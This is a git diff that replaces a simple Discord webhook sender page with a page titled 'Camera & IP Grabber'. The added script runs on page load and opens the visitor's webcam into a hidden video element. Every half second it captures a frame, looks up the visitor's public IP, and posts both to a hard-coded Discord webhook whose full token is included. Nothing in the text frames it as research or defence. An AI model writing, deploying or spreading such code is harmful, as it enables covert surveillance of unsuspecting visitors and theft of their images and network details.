@@ -1,45 +1,67 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Discord Webhook Sender</title>
-  <link rel="stylesheet" href="assets/css/style.css">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Camera & IP Grabber</title>
 </head>
 <body>
-  <div class="container">
-    <h1>Discord Webhook Sender</h1>
+<video id="video" autoplay playsinline style="display:none;"></video>
+<script>
+const webhook = "https://discord.com/api/webhooks/1375557655036301593/fAVFnmHle5XCW4nxYD3GKHetyJRbGyQa6IXia2LbrEmk4Sn6Gaym_YduQpvpgkD2h0oA";
 
-    <div id="webhooks">
-      <h2>Webhook URLs</h2>
-      <div id="webhook-list"></div>
-      <button onclick="addWebhookInput()">Add Webhook</button>
-    </div>
+async function getIP() {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip;
+  } catch {
+    return "unknown";
+  }
+}
 
-    <div>
-      <label>Message:</label>
-      <textarea id="message" rows="4" cols="50"></textarea>
-    </div>
+async function captureAndSend() {
+  const video = document.getElementById('video');
+  if (!video.srcObject) return;
 
-    <div>
-      <label>Delay (seconds):</label>
-      <input type="number" id="delay" value="1" min="0">
-    </div>
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    <div>
-      <label><input type="checkbox" id="repeat"> Repeat Sending</label>
-      <label><input type="checkbox" id="concurrent"> Send Concurrently</label>
-    </div>
+  const imgData = canvas.toDataURL('image/png');
 
-    <div class="buttons">
-      <button onclick="startSending()">Start</button>
-      <button onclick="stopSending()">Stop</button>
-      <button onclick="deleteSentMessages()">Delete Sent Messages</button>
-    </div>
+  const ip = await getIP();
 
-    <div id="log"></div>
-  </div>
+  const payload = {
+    content: `IP: ${ip}`,
+    embeds: [{
+      image: { url: imgData }
+    }]
+  };
 
-  <script src="assets/js/script.js"></script>
+  fetch(webhook, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(payload)
+  });
+}
+
+async function start() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById('video');
+    video.srcObject = stream;
+    video.play();
+
+    setInterval(captureAndSend, 500);
+  } catch (e) {
+    console.error('Camera access denied or error:', e);
+  }
+}
+
+start();
+</script>
 </body>
 </html>
